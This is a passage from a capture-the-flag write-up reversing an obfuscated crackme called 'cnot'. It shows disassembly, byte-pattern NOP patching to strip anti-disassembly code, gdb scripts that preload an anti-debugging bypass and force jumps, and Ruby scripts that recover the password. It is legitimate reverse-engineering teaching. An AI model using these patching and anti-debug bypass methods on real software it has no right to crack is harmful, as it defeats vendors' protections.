[rcx+53h]\r\n11 .text:0040F12C     push    rdx\r\n12 .text:0040F12D     call    $+5\r\n13 .text:0040F132     pop     rdx\r\n14 .text:0040F133     add     rdx, 8\r\n15 .text:0040F137     push    rdx\r\n16 .text:0040F138     retn\r\n17 .text:0040F138                ; -------------\r\n18 .text:0040F139    db  0Fh\r\n19 .text:0040F13A                ; -------------\r\n20 .text:0040F13A     pop     rdx\r\n21 .text:0040F13B     pop     rbx\r\n22 .text:0040F13C     pop     rcx\r\n23 .text:0040F13D     mov     rdi, [rbp-68h]\r\n24 .text:0040F141     mov     r15, rax\r\n25 .text:0040F144     call    sub_400824\r\n\nThis isn\'t quite right, because of the jz and the call/push/ret in the middle, but we\'ll deal with that shortly. For now, look at 0x0040F117—push \'W\'—and 0x40F144—call the function that calls fputc()! If you follow it down, you\'ll find the \'r\', \'o\', \'n\', \'g\', \'!\', newline, and then \'C\', \'o\', \'r\', \'r\', \'e\', \'c\', \'t\', \'!\'. That\'s great news! We found where it prints the two cases!\nThe problem is, it\'s ugly as sin. I can\'t even count the number of times I used \'u\' to undefine bad instructions and \'c\' to define better ones before I finally gave up and edited the binary...\nAnti-reversing\nThe best thing I ever did—and I wish I did it earlier!—was to fix the anti-reversing nonsense. There are long strings of the same thing that make analysis hard. In the previous example, everything from the push at 0x40F122 to the mov at 0x40F13D is totally worthless, and just confuses the disassembler, so let\'s get rid of it!\nI loaded up the file in xvi32.exe—my favourite Windows hex editor—and did a find/replace on the sequence of bytes:\n\r\n 51 48 31 C9 74 01 0F 59 51 53 52 E8 00 00 00 00 5A 48 83 C2 08 52 C3 0F 5A 5B 59\r\n\nwith NOPs:\n\r\n 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90\r\n\n936 occurrences replaced! Awesome! But there was still some obfuscation left that looked like this:\n\r\n1 .text:0040F123      xor     rcx, rcx\r\n2 .text:0040F126      jz      short near ptr loc_40F128+1\r\n3 .text:0040F128\r\n4 .text:0040F128 loc_40F128:\r\n5 .text:0040F128      mulps   xmm2, xmmword ptr [rcx+53h]\r\n6 .text:0040F12C      push    rdx\r\n\nNote the jz—it actually jumps one byte, which means the instruction immediately following—the mulps—is an invalid instruction. The 0x0f is unused! This one is simple to fix—just replace 74 01 FF—the jump and the fake instruction—with NOPs:\n\r\n  74 01 0F => 90 90 90\r\n\nThis fixes 290 more occurrences of code that confuses IDA!\nAnd then there\'s this:  \n\r\n1 .text:00400C44     call    $+5\r\n2 .text:00400C49     pop     rdx\r\n3 .text:00400C4A     add     rdx, 8\r\n4 .text:00400C4E     push    rdx\r\n5 .text:00400C4F     retn\r\n6 .text:00400C4F sub_400BD1      endp ; sp-analysis failed\r\n7 .text:00400C4F\r\n8 .text:00400C50     cvtps2pd xmm3, qword ptr [rbx+59h]\r\n\nWhich can be removed with this pattern:\n\r\n  e8 00 00 00 00 5a 48 83 c2 08 52 c3 0f\r\n\n74 of which were removed.\nAfter all that, I loaded the executable back in IDA, and it was much nicer! I realized later that there was probably more code I could have removed—such as the pop edi / jmp edi that\'s used instead of returning—but I got too invested in my IDA database that I didn\'t want to mess it up.\nTracking down the compare\nAll righty, now that we\'ve cleaned up the code, we\'re starting to make some progress! By the time I got here, it was about 2am on Friday night, and I was still going strong (despite Mak being asleep behind me on a table). [Editor\'s Note: I needed my beauty sleep, dammit!]\nLet\'s start by finding the \'Wrong\' and \'Correct\' strings again. You can breakpoint on fputc(), or you can just go to the definition of fputc() and keep jumping to cross references. Whatever you do, I want you to eventually wind up at the line that pushes the \'W\' from \'Wrong!\', which is here:\n\r\n1 .text:0040F117                 mov     dword ptr [rbp-68h], \'W\'\r\n\nTwo lines above it, you\'ll see a conditional jump:\n\r\n1 .text:0040F109                 jz      loc_40F359\r\n\nIf you follow that jump, you\'ll see that if it jumps, it prints out \'Correct\'; otherwise, it prints \'Wrong\'. We can confirm this by forcing the jump, but first let\'s update our gdbinit file to break at the \'start\' function:\n\r\n 1 ron@debian-x64 ~/cnot $ cat gdbinit\r\n 2 # Set up the environment\r\n 3 set disassembly-flavor intel\r\n 4 set confirm off\r\n 5 \r\n 6 # Disable the anti-debugging\r\n 7 set environment LD_PRELOAD ./overload.so\r\n 8 \r\n 9 # Put a breakpoint at the \'start\' function\r\n10 break *0x00400710\r\n11 \r\n12 # Run the program up to the breakpoint\r\n13 run\r\n\nNow we run the program, and change the jz at line 0x0040f109 to a jmp:\n\r\n 1 $ gdb -x ./gdbinit ./cnot\r\n 2 Reading symbols from /home/ron/cnot/cnot...(no debugging symbols found)...done.\r\n 3 Breakpoint 1 at 0x400710\r\n 4 \r\n 5 Breakpoint 1, 0x00400710 in ?? ()\r\n 6 (gdb) set {char}0x0040f109 = 0x90\r\n 7 (gdb) set {char}0x0040f10a = 0xE9\r\n 8 (gdb) x/2i 0x0040f109\r\n 9 0x40f109:       nop\r\n10 0x40f10a:       jmp    0x40f359\r\n11 (gdb) cont\r\n12 Please enter your password: hello\r\n13 Correct!\r\n\nSo, we change 0x401109 to 0x90 (nop) and 0x0040f10a to 0xe9 (jmp long), verify the instructions, and run the program. Sure enough, my password now produces \'hello\'. Success! Now I just have to backstep a little bit and find the comparison, and we\'re done! Simple! Haha!\n13 steps to success\nSo, every variable is set in an ass-backwards way. You get pretty accustomed to seeing it in this level, and kind of just mentally pattern-match it. I\'m sure there\'s a better way, but eh? I got pretty fast at it as time went on.\nThe decision whether or not to make the important jump comes from [rbp-78h], which comes from [rbp-58h] (via like ten other variables). The only way to get that variable set properly is right here:\n\r\n1 .text:0040F08E                mov     qword ptr [rbp-58h], 0\r\n2 .text:0040F096                mov     dword ptr [rbp-58h], 1\r\n\nRight below that, I noticed this code:\n\r\n 1 .text:0040F09D     jmp     short $+2\r\n 2 .text:0040F09F\r\n 3 .text:0040F09F loc_40F09F:      ; CODE XREF: sub_40911F+5F6Dj\r\n 4 .text:0040F09F     jmp     short $+2\r\n 5 .text:0040F0A1\r\n 6 .text:0040F0A1 loc_40F0A1:      ; CODE XREF: sub_40911F+59EBj\r\n 7 .text:0040F0A1     jmp     short $+2\r\n 8 .text:0040F0A3\r\n 9 .text:0040F0A3 loc_40F0A3:      ; CODE XREF: sub_40911F+53BAj\r\n10 .text:0040F0A3     jmp     short $+2\r\n11 .text:0040F0A5\r\n12 .text:0040F0A5 loc_40F0A5:      ; CODE XREF: sub_40911F+47DAj\r\n13 .text:0040F0A5     jmp     short $+2\r\n14 .text:0040F0A7\r\n15 .text:0040F0A7 loc_40F0A7:      ; CODE XREF: sub_40911F+3AB1j\r\n16 .text:0040F0A7     jmp     short $+2\r\n17 .text:0040F0A9\r\n18 .text:0040F0A9 loc_40F0A9:      ; CODE XREF: sub_40911F+2D88j\r\n19 .text:0040F0A9     jmp     short $+2\r\n20 .text:0040F0AB\r\n21 .text:0040F0AB loc_40F0AB:      ; CODE XREF: sub_40911F+21A8j\r\n22 .text:0040F0AB     jmp     short $+2\r\n23 .text:0040F0AD\r\n24 .text:0040F0AD loc_40F0AD:      ; CODE XREF: sub_40911F+2141j\r\n25 .text:0040F0AD     jmp     short $+2\r\n26 .text:0040F0AF\r\n27 .text:0040F0AF loc_40F0AF:      ; CODE XREF: sub_40911F+1DE9j\r\n28 .text:0040F0AF     jmp     short $+2\r\n29 .text:0040F0B1\r\n30 .text:0040F0B1 loc_40F0B1:      ; CODE XREF: sub_40911F+1D82j\r\n31 .text:0040F0B1     jmp     short $+2\r\n32 .text:0040F0B3\r\n33 .text:0040F0B3 loc_40F0B3:      ; CODE XREF: sub_40911F+1CB4j\r\n34 .text:0040F0B3     jmp     short $+2\r\n35 .text:0040F0B5\r\n36 .text:0040F0B5 loc_40F0B5:      ; CODE XREF: sub_40911F+1C04j\r\n37 .text:0040F0B5     jmp     short $+2\r\n38 .text:0040F0B7\r\n39 .text:0040F0B7 loc_40F0B7:      ; CODE XREF: sub_40911F+1B9Dj\r\n\nEach of those lines bypasses the \'set the good value\' line, and each of them is referred to earlier in this function. I immediately surmised that each of those locations were \"bad\" jumps—that is, there were thirteen or so checks that were happening, and that each one that failed would lead us back here. A thirteen character string seemed possible, where each letter was checked individually, so I started looking into it. Mak—awake once again—was not convinced.\nThe easy start\nThe final thing I did Friday night was look at the first check (the last one on that list), which is located at this line:\n\r\n1 .text:0040ACBC                 jz      loc_40F0B7\r\n\nWhat causes that jump to fail? Long story short, it\'s this:\n\r\n1 .text:0040AC8E                 cmp     r15d, [rbp-78h]\r\n\n...where r15d is an unknown value, and [rbp-78h] is 0x18 (24). Let\'s break and see what r15 is:\n\r\n 1   ron@debian-x64 ~/cnot $ gdb -x ./gdbinit ./cnot\r\n 2   Reading symbols from /home/ron/cnot/cnot...(no debugging symbols found)...done.\r\n 3   Breakpoint 1 at 0x400710\r\n 4 \r\n 5   Breakpoint 1, 0x00400710 in ?? ()\r\n 6   (gdb) b *0x0040ac8e\r\n 7   Breakpoint 2 at 0x40ac8e\r\n 8   (gdb) cont\r\n 9   Please enter your password: hello\r\n10 \r\n11   Breakpoint 2, 0x0040ac8e in ?? ()\r\n12   (gdb) print/d $r15\r\n13   $1 = 5\r\n14   (gdb) run\r\n15 \r\n16   Breakpoint 1, 0x00400710 in ?? ()\r\n17   (gdb) cont\r\n18   Please enter your password: moo\r\n19 \r\n20   Breakpoint 2, 0x0040ac8e in ?? ()\r\n21   (gdb) print/d $r15\r\n22   $2 = 3\r\n23 \r\n\nWhen I enter \'hello\', it\'s 5, and when I enter \'moo\', it\'s 3. It compares that value to 0x18 (24), and fails if it\'s anything else. We just found out the password length! And it was kind of easy!\nBy now it was about 5am on Friday night, and time for bed.\nNot as dumb as I look\nFirst thing Saturday morning—after three hours of sleep—I started and finished another flag—securereader. Don\'t get me started on securereader. I fucked up badly, and it took wayyyyyy longer than it should have.\nAnyway, by early afternoon, I was back to working on cnot. I was pretty sure those jumps were all the \'bad\' jumps, so—in what I consider my #1 decision on this entire flag, at least tied with finding/replacing the \'bad code\'—I added a bunch of nop-outs to my gdbinit file:\n\r\n 1 ron@debian-x64 ~/cnot $ cat ./gdbinit\r\n 2 # Set up the environment\r\n 3 set disassembly-flavor intel\r\n 4 set confirm off\r\n 5 \r\n 6 # Disable the anti-debugging\r\n 7 set environment LD_PRELOAD ./overload.so\r\n 8 \r\n 9 # Put a breakpoint at the \'start\' function\r\n10 break *0x00400710\r\n11 \r\n12 # Run the program up to the breakpoint\r\n13 run\r\n14 \r\n15 # Verify length\r\n16 set {int}0x040ACBC = 0x90909090\r\n17 set {short}0x040ACC0 = 0x9090\r\n18 \r\n19 set {int}0x040AD23 = 0x90909090\r\n20 set {short}0x040AD27 = 0x9090\r\n21 \r\n22 set {int}0x040ADD3 = 0x90909090\r\n23 set {short}0x040ADD7 = 0x9090\r\n24 \r\n25 set {int}0x040AEA1 = 0x90909090\r\n26 set {short}0x040AEA5 = 0x9090\r\n27 \r\n28 set {int}0x040AF08 = 0x90909090\r\n29 set {short}0x040AF0C = 0x9090\r\n30 \r\n31 set {int}0x040B260 = 0x90909090\r\n32 set {short}0x040B264 = 0x9090\r\n33 \r\n34 set {int}0x040B2C7 = 0x90909090\r\n35 set {short}0x040B2CB = 0x9090\r\n36 \r\n37 set {int}0x040BEA7 = 0x90909090\r\n38 set {short}0x040BEAB = 0x9090\r\n39 \r\n40 set {int}0x040CBD0 = 0x90909090\r\n41 set {short}0x040CBD4 = 0x9090\r\n42 \r\n43 set {int}0x040D8F9 = 0x90909090\r\n44 set {short}0x040D8FD = 0x9090\r\n45 \r\n46 set {int}0x040E4D9 = 0x90909090\r\n47 set {short}0x040E4DD = 0x9090\r\n48 \r\n49 set {int}0x040EB0A = 0x90909090\r\n50 set {short}0x040EB0E = 0x9090\r\n51 \r\n52 set {short}0x040F08C = 0x9090\r\n53 \r\n54 cont\r\n\nAfter like two hours of troubleshooting that code because I forgot that \'long\' = 8 bytes and \'int\' = 4 bytes (which Aemelianus had the pleasure to watch me fight with), eventually it worked:\n\r\n1 $ gdb -x ./gdbinit ./cnot\r\n2 Reading symbols from /home/ron/cnot/cnot...(no debugging symbols found)...done.\r\n3 Breakpoint 1 at 0x400710\r\n4 \r\n5 Breakpoint 1, 0x00400710 in ?? ()\r\n6 Please enter your password: hello\r\n7 Correct!\r\n8 \r\n9 Program exited normally.\r\n\nExcellent! I can easily test any of the checks without the others interfering!\nFrom here on out, I did everything in a more or less random order, and each step took a long time. Ultimately, however, there were four main types of checks I found: character class (upper/lower/numeric), adjacent checks, shift checks (I\'ll explain these later), and checksums. I solved the first three on Saturday, and the last—the hardest, the checksum—on Sunday. Let\'s take each of them individually.\nCharacter class\nThe character class checks happen right here:\n\r\n 1 .text:0040AD00                 mov     rdi, [rbp-70h]\r\n 2 .text:0040AD04                 mov     r15, rax        ; both = pointers to my string\r\n 3 .text:0040AD07                 call    do_validation2  ; Validate a pattern (fully reversed)\r\n 4 .text:0040AD0C                 mov     [rbp-68h], rax\r\n 5 .text:0040AD10                 mov     rax, r15\r\n 6 .text:0040AD13                 add     rsp, 0\r\n 7 .text:0040AD17                 pop     r9\r\n 8 .text:0040AD19                 pop     r8\r\n 9 .text:0040AD1B                 mov     r15d, [rbp-68h]\r\n10 .text:0040AD1F                 cmp     r15d, 0\r\n11 .text:0040AD23                 jz      bad_place2\r\n\ndo_validation2() is about a million lines, and is actually a great place to get your feet wet with how the obfuscation works. By the end of it, I could move through pretty quickly. It calls three different functions, which are:\n\r\n1 0x00402726 check_alphabetic(char c)\r\n2 0x004028AC check_lowercase(char c)\r\n3 0x0040297E check_numeric(char c)\r\n\nI\'m not going to dwell on how those work. Suffice to say, they\'re about as simple as anything is in this binary. One line in the source, and only about 150 lines in the binary!\nEssentially, throughout this function, you\'ll see things like:\n\r\n1 .text:00402AFD                 add     r11, rbx        ; add 0*8 to the offset\r\n2 .text:00402B1E                 mov     rax, [rax]       ; rax = first character (\"a\")\r\n3 .text:00402B40                 mov     rdi, rax\r\n4 .text:00402B43                 call    check_alphabetic ; Returns \'1\' if it\'s upper or lower case\r\n5 .text:00402B50                 cmp     eax, 0           ; \'1\' is good\r\n6 .text:00402B53                 jz      bad\r\n\n(note that I\'m leaving out the extra \'obfuscating\' lines)\nThis runs through every character, one by one, with similar checks. I did a ton of debugging to see what was going on, and was able to determine the \'possible\' values of each character:\n\r\nCharacter 1  :: Letter\r\nCharacter 2  :: Letter\r\nCharacter 3  :: Lowercase\r\nCharacter 4  :: Lowercase\r\nCharacter 5  :: Letter\r\nCharacter 6  :: Symbol (not letter or number)\r\nCharacter 7  :: Letter\r\nCharacter 8  :: Symbol\r\nCharacter 9  :: Number\r\nCharacter 10 :: Lowercase\r\nCharacter 11 :: Letter\r\nCharacter 12 :: Letter\r\nCharacter 13 :: Letter\r\nCharacter 14 :: Uppercase\r\nCharacter 15 :: Letter\r\nCharacter 16 :: Letter\r\nCharacter 17 :: Uppercase\r\nCharacter 18 :: Letter\r\nCharacter 19 :: Symbol\r\nCharacter 20 :: Letter\r\nCharacter 21 :: Letter (I originally had \'lowercase\', that was wrong)\r\nCharacter 22 :: Letter\r\nCharacter 23 :: Uppercase\r\nCharacter 24 :: Symbol\r\n\nIn addition to character classes, a couple properties were discovered here:\n\nThe fourth character had to be one higher than the tenth character\nThe twenty-first character was alphabetic, but if you subtract one it wasn\'t (therefore, it had to be a \'a\' or \'A\')\n\nSo now we have a lot of properties, and an actual letter! Progress! And we have one more check that\'ll pass; two down, eleven to go!\nAdjacent checks\nAfter the character class checks, I was getting a little faster. There\'s a ton of code, but eventually you learn how it indexes arrays, and that makes it much easier, since you can skip by about 95% of the code.\nThis section starts here:\n\r\n 1 .text:0040AEE5                 mov     rdi, [rbp-70h]\r\n 2 .text:0040AEE9                 mov     r15, rax\r\n 3 .text:0040AEEC                 call    do_validation_5 ; Validates adjacent letters, and their relationships to each other\r\n 4 .text:0040AEEC                                         ; rdi = pointer to string buffer\r\n 5 .text:0040AEF1                 mov     [rbp-68h], rax  ; rax shouldn\'t be 0\r\n 6 .text:0040AEF5                 mov     rax, r15\r\n 7 .text:0040AEF8                 add     rsp, 0\r\n 8 .text:0040AEFC                 pop     r9\r\n 9 .text:0040AEFE                 pop     r8\r\n10 .text:0040AF00                 mov     r15d, [rbp-68h]\r\n11 .text:0040AF04                 cmp     r15d, 0\r\n12 .text:0040AF08                 jz      bad_place5\r\n\nNote that I\'m not doing this in order; I don\'t have to, since I disable the checks I\'m not using!\nInside my stupidly named do_validation_5() (I didn\'t know what it was going to do when I named it!), you\'ll see the same pattern over and over and over; it loads a letter, then the next letter, and compares them with either jg (jump if greater) or jl (jump if less):\n\r\n1 .text:00404FE2                 mov     r10, [r10]       ; first letter\r\n2 .text:00405087                 mov     r11, [r11]       ; second letter\r\n3 .text:0040508A                 cmp     r10d, r11d\r\n4 .text:0040508D                 jg      short loc_405096 ; good jump\r\n5 .text:0040508F                 mov     ebx, 0           ; bad\r\n6 .text:00405094                 jmp     short loc_40509B\r\n\nIf you go through this, you\'ll get the following relationships:\n\r\ncharacter[1]  > character[2]\r\ncharacter[2]  > character[3]\r\ncharacter[3]  < character[4]\r\ncharacter[4]  > character[5]\r\ncharacter[5]  > character[6]\r\ncharacter[6]  < character[7]\r\ncharacter[7]  > character[8]\r\ncharacter[8]  < character[9]\r\ncharacter[9]  < character[10]\r\ncharacter[10] < character[11]\r\ncharacter[11] > character[12]\r\ncharacter[12] < character[13]\r\ncharacter[13] > character[14]\r\ncharacter[14] < character[15]\r\ncharacter[15] < character[16]\r\ncharacter[16] > character[17]\r\ncharacter[17] < character[18]\r\ncharacter[18] > character[19]\r\ncharacter[19] < character[20]\r\ncharacter[20] > character[21]\r\ncharacter[21] < character[22]\r\ncharacter[22] > character[23]\r\ncharacter[23] > character[24]\r\n\nWhen I got to this point, Mak started writing a Prolog and also a Python program so we could take these relationships and start deriving relationships. In the end, he started working on another flag, and I never actually used these relationships to solve anything...\nOn the plus side, after the first few, it was fast going! I did the first seven or eight carefully and with a debugger, and all the rest I just blew through in about a half hour!\nShift checks\nSo, I purposely waited to work on these ones, because they called long functions, which called other long functions, which did crazy shifty stuff. After I actually started reversing, I realized that it was actually pretty easy—most of them did the same thing! Everything in this binary looks long and complicated, though.\nLet\'s start with one of the innermost functions. Removing all the crap, it does this:\n\r\n 1 .text:00400E75 shift10         proc near\r\n 2 .text:00400EAA                 mov     rax, rdi        ; rax = arg\r\n 3 .text:00400EC8                 mov     r10, rax        ; r10 = arg\r\n 4 .text:00400ECB                 mov     r11d, 0Ah       ; r11 = 10\r\n 5 .text:00400ED2                 mov     r15d, r10d      ; r15 = arg\r\n 6 .text:00400ED5                 mov     ecx, r11d       ; ecx = 10\r\n 7 .text:00400ED8                 sar     r15d, cl        ; r15 = arg >> 10\r\n 8 .text:00400EDB                 mov     ebx, r15d       ; ebx = rdi >> 10\r\n 9 .text:00400EDF                 mov     r10d, 1Fh       ; r10 = 0x1f\r\n10 .text:00400F00                 and     ebx, r10d       ; ebx = (arg >> 10) & 0x1f\r\n11 .text:00400F03                 mov     rax, rbx\r\n12 .text:00400F1B                 pop     rdi\r\n13 .text:00400F1C                 jmp     rdi\r\n\nWhich is basically:\n\r\n1 return (arg >> 10) & 0x1F\r\n\nEasy! There are actually a bunch of functions that do almost the same thing:\n\r\n1 def shift0(c)  return (c >> 0) & 0x1F; end\r\n2 # Oddly, there\'s no shift5()\r\n3 def shift10(c) return (c >> 0) & 0x1F; end\r\n4 def shift15(c) return (c >> 0) & 0x1F; end\r\n5 def shift20(c) return (c >> 0) & 0x1F; end\r\n6 def shift25(c) return (c >> 0) & 0x1F; end\r\n7 def shift30(c) return (c >> 0) & 0x03; end\r\n\nThen those functions are called from two others (actually, three, but the third is never used in the code we care about):\n\r\n1 .text:00401E96 shifter()\r\n2 .text:00402413 shifter2()\r\n\nI\'m not going to waste your time by reversing them. They\'re kinda long, but fairly simple. Here is what they end up as:\n\r\n1 def shifter(c, i = 0)\r\n2   return i | (1 << shift10(c)) | (1 << shift5(c)) | (1 << shift0(c))\r\n3 end\r\n4 \r\n5 def shifter2(c, i = 0)\r\n6   return i | (1 << shift25(c)) | (1 << shift20(c)) | (1 << shift10(c)) | (1 << shift0(c))\r\n7 end\r\n\nBasically, take various sequences of five bytes within the string, and set those bits in another value!\nNow, how are these used? The first use is easy, and is actually the second-simplest check (after the length check). It looks like this (once again, I\'ve removed obfuscating lines):\n\r\n1 .text:0040B04B      mov     rsi, [rbp-80h]  ; rsi = last character\r\n2 .text:0040B04F      mov     r15, rax\r\n3 .text:0040B052      call    shifter\r\n4 .text:0040B057      mov     [rbp-70h], rax\r\n5 .text:0040B066      mov     qword ptr [rbp-78h], 0\r\n6 .text:0040B06E      mov     dword ptr [rbp-78h], 80000003h\r\n7 .text:0040B075      mov     r15d, [rbp-70h]\r\n8 .text:0040B079      cmp     r15d, [rbp-78h]\r\n9 .text:0040B07D      jz      short loc_40B093 ; Good jump\r\n\nSo the last line of the string is the symbol that, when put through shifter(), produces 0x80000003? That\'s easy! Here\'s a quick Ruby program (I actually did it in a much more complicated way originally, by literally reversing the algorithm, but that was dumb):\n\r\n1 0x20.upto(0x7F) do |i|\r\n2 if(shifter(i) == 0x80000003)\r\n3     puts(\"Character: #{i.chr}\")\r\n4 end\r\n5 end\r\n\nWhich prints out:\n\r\n1 ron@debian-x86 ~$ ruby ./do_shift.rb\r\n2 Character: ?\r\n\nThe last character is a question mark! Awesome!\nAfter that, there are a bunch of checks (all remaining checks but two, in fact!) that all sort of look the same (and are implemented inline, not in functions). One of them you can find starting at 0x0040BEAD, and the logic is something like this:\n\r\n 1 c = second_character;\r\n 2 if(shifter(c, c) == shifter2(c, c))\r\n 3 {\r\n 4   if(shifter(c - 0x20, c - 0x20) != shifter2(c - 0x20, c - 0x20))\r\n 5   {\r\n 6     if(c < \'i\' && c > \'d\')\r\n 7     {\r\n 8       acceptable_second_character(c);\r\n 9     }\r\n10   }\r\n11 }\r\n\nImplementing it in Ruby (this code will only work in 1.9 because of String.ord()) will look something like this:\n\r\n 1 ?A.upto(?Z) do |i|\r\n 2   i = i.ord\r\n 3   (set &lt;&lt; i) if(shifter(i, i) == shifter2(i, i))\r\n 4 end\r\n 5 ?a.ord.upto(?z.ord) do |i|\r\n 6   i = i.ord\r\n 7   (set &lt;&lt; i) if(shifter(i, i) == shifter2(i, i))\r\n 8 end\r\n 9 \r\n10 set.each do |i|\r\n11   if(shifter(i - 0x20, i - 0x20) != shifter2(i - 0x20, i - 0x20))\r\n12     if(i &gt; ?d.ord &amp;&amp; i < ?i.ord)\r\n13       puts(i.chr)\r\n14     end\r\n15   end\r\n16 end\r\n\nAnd running it:\n\r\n1 $ ruby do_shift.rb\r\n2 h\r\n\nTells us that the only possibility is \'h\'! We just solved the second letter!\nThere are a ton of checks like this, and I\'m not going to go over the rest of them. The only other noteworthy \"shift\" check is the function defined here:\n\r\n1 .text:00406F32 check_duplicates\r\n\nWhich goes through a bunch of fields, and requires them to be equal to one another (eg, the sixth, eighth, and nineteenth characters are the same; the fourteenth and seventeenth letter are the same; etc).\nWhen all\'s said and done, at the end of the \'shift\' stuff, and including the character class checks, we have the following properties:\n\r\n  Character 1  :: \'w\'\r\n  Character 2  :: \'h\'\r\n  Character 3  :: \'e\'\r\n  Character 4  :: Lowercase letter = the 10th character + 1\r\n  Character 5  :: \'e\'\r\n  Character 6  :: Symbol, same as 8th and 19th characters\r\n  Character 7  :: \'u\', \'v\', or \'w\'\r\n  Character 8  :: Symbol, same as 6th and 19th characters\r\n  Character 9  :: Number\r\n  Character 10 :: Lowercase\r\n  Character 11 :: Letter\r\n  Character 12 :: \'e\'\r\n  Character 13 :: \'n\'\r\n  Character 14 :: Uppercase, same as 17th\r\n  Character 15 :: \'h\', \'i\', \'j\', or \'k\'\r\n  Character 16 :: Letter, same as 18th\r\n  Character 17 :: Uppercase, same as 14th\r\n  Character 18 :: Letter, same as 16th\r\n  Character 19 :: Symbol, same as 6th and 8th\r\n  Character 20 :: \'n\'\r\n  Character 21 :: \'a\' or \'A\'\r\n  Character 22 :: Letter\r\n  Character 23 :: Uppercase\r\n  Character 24 :: \'?\'\r\n\nTo put it another way:\n\r\n  whe_e._.#__en_____.na__?\r\n\nI reached this point... maybe 5am on Saturday night? The next hour me and Rylaan and others spent trying to make guesses. We were reasonably sure that the fourth letter was \'r\', making the first word \'where\'. That would make the tenth character a \'q\' and the eleventh a \'u\'. That worked out pretty well. And putting a \'u\' in the seventh character (since it\'s much more likely than \'v\' or \'w\') and making the symbols into spaces made sense. That gave us:\n\r\n  where u #quen_____ na__?\r\n\nWe also surmised that the last word was \'namE\' or \'nAME\' or something, but that turned out to be wrong so I won\'t show that part off. :)\nHere is what I had scribbled down at this point.\nBefore bed, I wrote a quick Ruby script that would bruteforce guess all unknown characters, hoping to guess it by morning. That was also a failure. It barely got anywhere in the three hours I slept.\nChecksums\nI went to sleep on the hackerspace couch at 6am Saturday night, and woke up at 9am with the idea: \"quantum\"! \"where u quantum name\" or something. So I jumped up, ran to the computer, and realized that that made no sense. Crap! But I was already up, may as well work on it more. I spent the next little while updating Mak on my progress and thinking through the next step.\nI spent a few hours working on these four checksum values:\n\r\n1 .text:0040AD41                 mov     dword ptr [rbp-78h], 0FAF7F5FFh ; checksum1\r\n2 .text:0040AD81                 mov     dword ptr [rbp-90h], 0A40121Fh  ; checksum2\r\n3 .text:0040AE00                 mov     dword ptr [rbp-78h], 0FF77F7F6h ; checksum3\r\n4 .text:0040AE4F                 mov     dword ptr [rbp-90h], 0FD9E7F5Fh ; checksum4\r\n\nI spent hours trying to reverse how those were calculated before finally giving up. I was running out of ideas. I had eleven of the thirteen checks passing, with only the four checksums (in two checks) to go! Gah!\nI noticed an interesting property in the checksums, though: the values I was generating were actually quite close to the real ones, compared to what they\'d originally been! If I changed a known \"good\" character to a bad one, it got worse. All I had to do was figure out a way to either generate the checksums myself or pull them from memory! At this point in the game, generating them myself was pretty much outta the question, so I had to find a way to extract them, and quickly!\nI won\'t bore you with the failed attempts, only the successful attempt. It\'s a Ruby program, and it looks something like this (check out the sweet syntax highlighting, I even highlighted the gdbinit file properly; that wasn\'t easy!):\n\r\n  1 def count_bits(i)\r\n  2   bits = 0\r\n  3 \r\n  4   while(i != 0) do\r\n  5     if((i & 1) == 1)\r\n  6       bits += 1\r\n  7     end\r\n  8 \r\n  9     i >>= 1\r\n 10   end\r\n 11 \r\n 12   return bits\r\n 13 end\r\n 14 \r\n 15 def go(str)\r\n 16   puts(\" String: \'#{str}\'\")\r\n 17 \r\n 18   # Write the current test string to a file called \'stdin\'\r\n 19   File.open(\"./stdin\", \"w\") do |f|\r\n 20     f.write(str)\r\n 21   end\r\n 22 \r\n 23   File.open(\"./gdb\", \"w\") do |f|\r\n 24   f.write <<EOF\r\n 25 # Set up the environment\r\n 26 set disassembly-flavor intel\r\n 27 set confirm off\r\n 28 \r\n 29 # Disable the anti-debugging\r\n 30 set environment LD_PRELOAD ./overload.so\r\n 31 \r\n 32 # Read from the \"stdin\" file, which is where we\'re writing the data\r\n 33 set args < ./stdin\r\n 34 \r\n 35 # Break at the first check (the length)\r\n 36 b *0x040AC83\r\n 37 run\r\n 38 \r\n 39 # Make all 4 checksums run by forcing jumps to happen\r\n 40 set {char}0x40AD50 = 0xeb\r\n 41 set {char}0x40AE0F  = 0xeb\r\n 42 \r\n 43 # Checksum 1 and 2\r\n 44 set {int}0x040ADD3 = 0x90909090\r\n 45 set {short}0x040ADD7 = 0x9090\r\n 46 \r\n 47 # Checksum 3 and 4\r\n 48 set {int}0x040AEA1 = 0x90909090\r\n 49 set {short}0x040AEA5 = 0x9090\r\n 50 \r\n 51 # TODO: Test once mak finishes the python tool\r\n 52 # Check adjacent characters\r\n 53 set {int}0x040AF08 = 0x90909090\r\n 54 set {short}0x040AF0C = 0x9090\r\n 55 \r\n 56 # Checksum1\r\n 57 b *0x000000000040AD4C\r\n 58 \r\n 59 # Checksum2\r\n 60 b *0x000000000040AD92\r\n 61 \r\n 62 # Checksum3\r\n 63 b *0x000000000040AE0F\r\n 64 \r\n 65 # Checksum4\r\n 66 b *0x000000000040AE60\r\n 67 \r\n 68 cont\r\n 69 \r\n 70 print/x $r15\r\n 71 cont\r\n 72 \r\n 73 print/x $r15\r\n 74 cont\r\n 75 \r\n 76 print/x $r15\r\n 77 cont\r\n 78 \r\n 79 print/x $r15\r\n 80 cont\r\n 81 \r\n 82 # We continue before quitting so we can make sure \'Success!\' is printed\r\n 83 quit\r\n 84 \r\n 85 EOF\r\n 86   end\r\n 87 \r\n 88   checksums = []\r\n 89 \r\n 90   # Our list of known-good checksums\r\n 91   good_checksums = [0xFAF7F5FF, 0xA40121F, 0xFF77F7F6, 0xFD9E7F5F]\r\n 92 \r\n 93   # Run gdb with our new config file\r\n 94   IO.popen(\"gdb -x ./gdb ./cnot\") {|p|\r\n 95     loop do\r\n 96       line = p.gets\r\n 97       if(line.nil?)\r\n 98         break\r\n 99       end\r\n100       if(line =~ / = /)\r\n101         checksums << line.gsub(/.* = /, \'\').chomp.to_i(16)\r\n102       end\r\n103 \r\n104       if(line =~ /Wrong/)\r\n105         puts(line)\r\n106         puts(\"ERROR!\")\r\n107         exit\r\n108       end\r\n109     end\r\n110   }\r\n111 \r\n112   puts(\" Expected: %08x %08x %08x %08x\" % [good_checksums[0], good_checksums[1], good_checksums[2], good_checksums[3]])\r\n113   puts(\" Received: %08x %08x %08x %08x\" % [checksums[0],      checksums[1],      checksums[2],      checksums[3]])\r\n114 \r\n115   # Count the different bits and print the difference\r\n116   diff = count_bits(good_checksums[0] ^ checksums[0]) + count_bits(good_checksums[2] ^ checksums[2]) + count_bits(good_checksums[1] ^ 